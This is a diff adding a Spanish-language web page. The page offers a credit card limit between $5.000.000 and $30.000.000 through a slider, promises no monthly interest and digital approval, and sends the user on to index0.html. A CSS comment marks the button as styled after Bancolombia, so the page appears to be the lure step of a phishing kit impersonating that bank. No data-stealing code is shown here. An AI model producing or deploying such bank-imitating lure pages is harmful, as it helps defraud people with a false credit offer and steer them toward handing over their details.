@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+	 
+<meta charset="UTF-8">
+<title>Seleccionar Cupo</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+body {
+    margin: 0;
+    background: #f5f5f5;
+    font-family: Arial, sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    padding: 20px;
+    box-sizing: border-box;
+}
+
+/* Contenedor Principal (Flex Wrapper) */
+.contenedor-principal {
+    display: flex;
+    flex-wrap: wrap;
+    justify-content: center;
+    align-items: center;
+    gap: 30px;
+    width: 100%;
+    max-width: 900px;
+}
+
+/* Contenedor Imagen */
+.contenedor-imagen {
+    flex: 1 1 300px;
+    max-width: 400px;
+    display: flex;
+    justify-content: center;
+}
+
+.contenedor-imagen img {
+    width: 100%;
+    height: auto;
+    border-radius: 16px;
+    box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+}
+
+/* Contenedor Contenido (Caja) */
+.contenedor-contenido {
+    flex: 1 1 300px;
+    max-width: 420px;
+}
+
+.caja {
+    background: #fff;
+    padding: 25px;
+    border-radius: 16px;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+    text-align: center;
+}
+
+.titulo {
+    font-size: 20px;
+    font-weight: bold;
+    margin-bottom: 15px;
+    color: #333;
+}
+
+.monto {
+    font-size: 32px;
+    font-weight: bold;
+    margin: 15px 0;
+    color: #000;
+}
+
+input[type=range] {
+    width: 100%;
+    margin: 20px 0;
+    cursor: pointer;
+}
+
+.minmax {
+    display: flex;
+    justify-content: space-between;
+    font-size: 14px;
+    color: #666;
+    margin-bottom: 15px;
+}
+
+.aviso {
+    font-size: 14px;
+    color: #d32f2f;
+    margin-top: 15px;
+    line-height: 1.4;
+}
+
+/* BOTÓN ESTILO BANCOLOMBIA */
+.boton {
+    margin-top: 25px;
+    width: 100%;
+    padding: 16px;
+    background: #ffd000;
+    border: none;
+    border-radius: 8px;
+    font-size: 18px;
+    font-weight: 700;
+    cursor: pointer;
+    transition: background 0.3s;
+    color: #2c2a29;
+}
+
+.boton:hover {
+    background: #e6c620;
+}
+
+/* Ajustes móviles específicos */
+@media (max-width: 768px) {
+    .contenedor-principal {
+        flex-direction: column;
+        gap: 20px;
+    }
+    
+    .contenedor-imagen, .contenedor-contenido {
+        max-width: 100%;
+        width: 100%;
+    }
+}
+</style>
+</head>
+
+<body>
+
+<div class="contenedor-principal">
+
+    <!-- ✅ CONTENEDOR IMAGEN -->
+    <div class="contenedor-imagen">
+        <img src="images/photo_5116631760371387324_w.jpg" alt="Tarjeta">
+    </div>
+
+    <!-- ✅ CONTENEDOR CONTENIDO -->
+    <div class="contenedor-contenido">
+        <div class="caja">
+
+            <div class="titulo">
+                Escoge el cupo ideal entre $5.000.000 y $30.000.000
+            </div>
+
+            <div class="monto" id="valor">
+                $5.000.000
+            </div>
+
+            <input type="range" min="5000000" max="30000000" step="500000" value="5000000" id="slider" oninput="actualizar()">
+
+            <div class="minmax">
+                <span>$5.000.000</span>
+                <span>$30.000.000</span>
+            </div>
+
+            <div class="aviso">
+                El cupo se asigna sin intereses mensuales y con aprobación digital.
+            </div>
+
+            <!-- ✅ BOTÓN QUE ENVÍA A OTRO INDEX -->
+            <button class="boton" onclick="window.location.href='index0.html'">
+                SOLICITAR TARJETA
+            </button>
+
+        </div>
+    </div>
+
+</div>
+
+<script>
+function actualizar() {
+    let valor = document.getElementById("slider").value;
+    document.getElementById("valor").innerText =
+        "$" + Number(valor).toLocaleString("es-CO");
+}
+</script>
+
+</body>
+</html>
